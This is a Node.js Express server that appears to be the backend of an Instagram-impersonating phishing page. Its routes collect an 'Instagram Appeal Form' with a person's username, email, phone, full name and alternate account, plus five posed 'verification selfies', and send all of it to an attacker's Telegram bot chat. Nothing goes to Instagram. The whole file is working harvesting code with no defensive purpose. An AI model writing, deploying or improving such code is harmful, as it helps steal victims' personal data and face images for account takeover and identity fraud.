const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set!');
}

app.use(express.json());
app.use(express.static('public'));

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }
});

// ---------- API Routes ----------

app.post('/api/submit-form', (req, res) => {
  // Phone number ab 'phone' field me aayega (countryCode + number combined)
  const { type, username, email, phone, fullname, alternative, relationship } = req.body;
  
  const message = `📋 <b>Instagram Appeal Form</b>

<b>Type:</b> ${type}
━━━━━━━━━━━━━━━━━━━━
<b>👤 Username:</b> ${username}
<b>📧 Email:</b> ${email}
<b>📱 Phone:</b> ${phone || 'N/A'}
<b>📝 Name:</b> ${fullname}
<b>🔗 Alt Account:</b> ${alternative || 'N/A'}
<b>👥 Relationship:</b> ${relationship}
━━━━━━━━━━━━━━━━━━━━
<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
  
  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error('Form send error:', err);
      res.status(500).json({ error: 'Failed to send form' });
    });
});

app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
  console.log('📸 Selfie request received');
  console.log('Body:', req.body);
  console.log('File present?', !!req.file);

  if (!req.file) {
    console.log('❌ No file in request');
    return res.status(400).json({ error: 'No photo uploaded' });
  }

  const { username, formType, poseText, poseNumber } = req.body;
  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>

<b>👤 User:</b> ${username}
<b>📝 Pose:</b> ${poseText}
<b>📋 Type:</b> ${formType}
<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramPhoto(req.file.buffer, caption)
    .then(() => {
      console.log('✅ Photo sent to Telegram');
      res.json({ success: true });
    })
    .catch(err => {
      console.error('❌ Telegram photo error:', err);
      res.status(500).json({ error: 'Failed to send photo' });
    });
});

app.post('/api/verification-complete', (req, res) => {
  const { username, email, phone, fullname, formType } = req.body;
  const message = `✅ <b>VERIFICATION COMPLETED</b>

<b>👤 User:</b> ${username}
<b>📧 Email:</b> ${email}
<b>📱 Phone:</b> ${phone || 'N/A'}
<b>📝 Name:</b> ${fullname}
<b>📋 Form:</b> ${formType}
<b>📸 Photos:</b> 5/5
<b>✓ Status:</b> Ready for Review
<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error('Complete error:', err);
      res.status(500).json({ error: 'Failed' });
    });
});

// ---------- Telegram Helpers ----------
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
  });
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`sendMessage failed: ${errorText}`);
  }
  return response.json();
}

async function sendTelegramPhoto(buffer, caption) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  const blob = new Blob([buffer]);
  formData.append('photo', blob, 'selfie.jpg');
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');

  const response = await fetch(url, {
    method: 'POST',
    body: formData
  });

  if (!response.ok) {
    const errorText = await response.text();
    console.error('Telegram API Error Response:', errorText);
    throw new Error(`sendPhoto failed: ${errorText}`);
  }
  return response.json();
}

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📸 Bot token: ${BOT_TOKEN ? 'Set' : 'Not set'}`);
  console.log(`📱 Chat ID: ${CHAT_ID ? 'Set' : 'Not set'}`);
});
